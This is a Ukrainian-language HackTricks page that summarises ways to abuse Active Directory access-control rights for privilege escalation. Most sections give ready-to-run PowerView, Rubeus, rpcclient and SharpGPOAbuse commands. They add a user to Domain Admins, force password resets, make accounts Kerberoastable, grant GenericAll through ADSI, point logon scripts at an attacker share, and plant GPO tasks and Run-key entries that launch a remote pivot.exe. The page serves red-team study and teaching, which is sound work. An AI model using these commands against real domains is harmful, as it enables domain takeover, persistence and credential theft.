# Зловживання ACL/ACE Active Directory

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

**Ця сторінка в основному є підсумком технік з** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **та** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Для отримання додаткових деталей перевірте оригінальні статті.**

## **Права GenericAll на користувача**

Ця привілегія надає зловмиснику повний контроль над цільовим обліковим записом користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl`, зловмисник може:

* **Змінити пароль цілі**: Використовуючи `net user <username> <password> /domain`, зловмисник може скинути пароль користувача.
* **Цілеспрямоване Kerberoasting**: Призначити SPN обліковому запису користувача, щоб зробити його доступним для kerberoasting, а потім використовувати Rubeus та targetedKerberoast.py для витягування та спроби зламати хеші квитків на отримання квитків (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Targeted ASREPRoasting**: Вимкніть попередню аутентифікацію для користувача, зробивши їх обліковий запис вразливим до ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Права на Групу**

Ця привілегія дозволяє зловмиснику маніпулювати членством у групах, якщо у них є `GenericAll` права на групу, таку як `Domain Admins`. Після ідентифікації відмінного імені групи за допомогою `Get-NetGroup`, зловмисник може:

* **Додати Себе до Групи Domain Admins**: Це можна зробити за допомогою прямих команд або використовуючи модулі, такі як Active Directory або PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Утримання цих привілеїв на об'єкті комп'ютера або обліковому записі користувача дозволяє:

* **Kerberos Resource-based Constrained Delegation**: Дозволяє захопити об'єкт комп'ютера.
* **Shadow Credentials**: Використовуйте цю техніку для видавання себе за обліковий запис комп'ютера або користувача, експлуатуючи привілеї для створення тіньових облікових даних.

## **WriteProperty on Group**

Якщо користувач має права `WriteProperty` на всі об'єкти для конкретної групи (наприклад, `Domain Admins`), вони можуть:

* **Додати Себе до Групи Domain Admins**: Це можна досягти, поєднуючи команди `net user` та `Add-NetGroupUser`, цей метод дозволяє ескалацію привілеїв у домені.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ця привілегія дозволяє зловмисникам додавати себе до певних груп, таких як `Domain Admins`, за допомогою команд, які безпосередньо маніпулюють членством у групі. Використання наступної послідовності команд дозволяє самостійно додаватися:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Самостійне членство)**

Схоже на привілей, це дозволяє зловмисникам безпосередньо додавати себе до груп, змінюючи властивості групи, якщо у них є право `WriteProperty` на ці групи. Підтвердження та виконання цього привілею здійснюється за допомогою:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Утримання `ExtendedRight` на користувача для `User-Force-Change-Password` дозволяє скидання паролів без знання поточного пароля. Перевірка цього права та його експлуатація можуть бути виконані через PowerShell або альтернативні командні інструменти, пропонуючи кілька методів для скидання пароля користувача, включаючи інтерактивні сесії та однорядкові команди для неінтерактивних середовищ. Команди варіюються від простих викликів PowerShell до використання `rpcclient` на Linux, демонструючи універсальність векторів атак.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner на групу**

Якщо зловмисник виявляє, що має права `WriteOwner` на групу, він може змінити власника групи на себе. Це особливо важливо, коли йдеться про групу `Domain Admins`, оскільки зміна власника дозволяє отримати більший контроль над атрибутами групи та членством. Процес включає в себе ідентифікацію правильного об'єкта за допомогою `Get-ObjectAcl`, а потім використання `Set-DomainObjectOwner` для зміни власника, або за SID, або за ім'ям.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite на користувача**

Ця дозволяє зловмиснику змінювати властивості користувача. Зокрема, з доступом `GenericWrite`, зловмисник може змінити шлях до сценарію входу користувача, щоб виконати шкідливий сценарій під час входу користувача. Це досягається за допомогою команди `Set-ADObject`, щоб оновити властивість `scriptpath` цільового користувача, вказавши на сценарій зловмисника.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite на групу**

З цим привілеєм зловмисники можуть маніпулювати членством у групі, наприклад, додаючи себе або інших користувачів до конкретних груп. Цей процес включає створення об'єкта облікових даних, використання його для додавання або видалення користувачів з групи та перевірку змін членства за допомогою команд PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Володіння об'єктом AD та наявність привілеїв `WriteDACL` на ньому дозволяє зловмиснику надати собі привілеї `GenericAll` над об'єктом. Це досягається через маніпуляції з ADSI, що дозволяє повний контроль над об'єктом та можливість змінювати його членство в групах. Незважаючи на це, існують обмеження при спробі експлуатувати ці привілеї за допомогою командлетів модуля Active Directory `Set-Acl` / `Get-Acl`.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replication on the Domain (DCSync)**

Атака DCSync використовує специфічні дозволи на реплікацію в домені, щоб імітувати Контролер домену та синхронізувати дані, включаючи облікові дані користувачів. Ця потужна техніка вимагає дозволів, таких як `DS-Replication-Get-Changes`, що дозволяє зловмисникам витягувати чутливу інформацію з середовища AD без прямого доступу до Контролера домену. [**Дізнайтеся більше про атаку DCSync тут.**](../dcsync.md)

## Делегування GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Делегування GPO

Делегований доступ для управління об'єктами групової політики (GPO) може створювати значні ризики для безпеки. Наприклад, якщо користувачу, такому як `offense\spotless`, делеговані права управління GPO, він може мати привілеї, такі як **WriteProperty**, **WriteDacl** та **WriteOwner**. Ці дозволи можуть бути зловживані зловмисними цілями, як виявлено за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Перерахунок дозволів GPO

Щоб виявити неправильно налаштовані GPO, команди PowerSploit можна з'єднати разом. Це дозволяє виявити GPO, до яких конкретний користувач має права управління: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Комп'ютери з застосованою політикою**: Можливо визначити, до яких комп'ютерів застосовується конкретний GPO, що допомагає зрозуміти обсяг потенційного впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Політики, застосовані до конкретного комп'ютера**: Щоб побачити, які політики застосовані до певного комп'ютера, можна використовувати команди, такі як `Get-DomainGPO`.

**OU з застосованою політикою**: Визначити організаційні одиниці (OU), на які вплинула конкретна політика, можна за допомогою `Get-DomainOU`.

### Зловживання GPO - New-GPOImmediateTask

Неправильно налаштовані GPO можуть бути використані для виконання коду, наприклад, шляхом створення термінового запланованого завдання. Це можна зробити, щоб додати користувача до групи локальних адміністраторів на уражених машинах, значно підвищуючи привілеї:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Зловживання GPO

Модуль GroupPolicy, якщо встановлений, дозволяє створювати та пов'язувати нові GPO, а також встановлювати параметри, такі як значення реєстру для виконання бекдорів на уражених комп'ютерах. Цей метод вимагає оновлення GPO та входу користувача в комп'ютер для виконання:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Зловживання GPO

SharpGPOAbuse пропонує метод зловживання існуючими GPO, додаючи завдання або змінюючи налаштування без необхідності створення нових GPO. Цей інструмент вимагає модифікації існуючих GPO або використання інструментів RSAT для створення нових перед застосуванням змін:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Примусове оновлення політики

Оновлення GPO зазвичай відбуваються приблизно кожні 90 хвилин. Щоб прискорити цей процес, особливо після внесення змін, команду `gpupdate /force` можна використовувати на цільовому комп'ютері для примусового негайного оновлення політики. Ця команда забезпечує застосування будь-яких змін до GPO без очікування наступного автоматичного циклу оновлення.

### Під капотом

При перевірці запланованих завдань для певного GPO, наприклад, `Misconfigured Policy`, можна підтвердити додавання завдань, таких як `evilTask`. Ці завдання створюються за допомогою скриптів або командних інструментів, що мають на меті змінити поведінку системи або підвищити привілеї.

Структура завдання, як показано у XML конфігураційному файлі, згенерованому `New-GPOImmediateTask`, описує специфіку запланованого завдання - включаючи команду, що має бути виконана, та її тригери. Цей файл представляє, як заплановані завдання визначаються та керуються в межах GPO, надаючи метод для виконання довільних команд або скриптів як частини виконання політики.

### Користувачі та групи

GPO також дозволяють маніпулювати членством користувачів та груп на цільових системах. Шляхом редагування файлів політики Користувачів та Груп безпосередньо, зловмисники можуть додавати користувачів до привілейованих груп, таких як локальна група `administrators`. Це можливо завдяки делегуванню прав управління GPO, що дозволяє змінювати файли політики, щоб включити нових користувачів або змінити членство в групах.

XML конфігураційний файл для Користувачів та Груп описує, як ці зміни реалізуються. Додаючи записи до цього файлу, конкретним користувачам можуть бути надані підвищені привілеї на уражених системах. Цей метод пропонує прямий підхід до підвищення привілеїв через маніпуляцію GPO.

Крім того, можуть бути розглянуті додаткові методи виконання коду або підтримки постійності, такі як використання скриптів входу/виходу, модифікація ключів реєстру для автозапуску, встановлення програмного забезпечення через .msi файли або редагування конфігурацій служб. Ці техніки надають різні шляхи для підтримки доступу та контролю цільових систем через зловживання GPO.

## Посилання

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
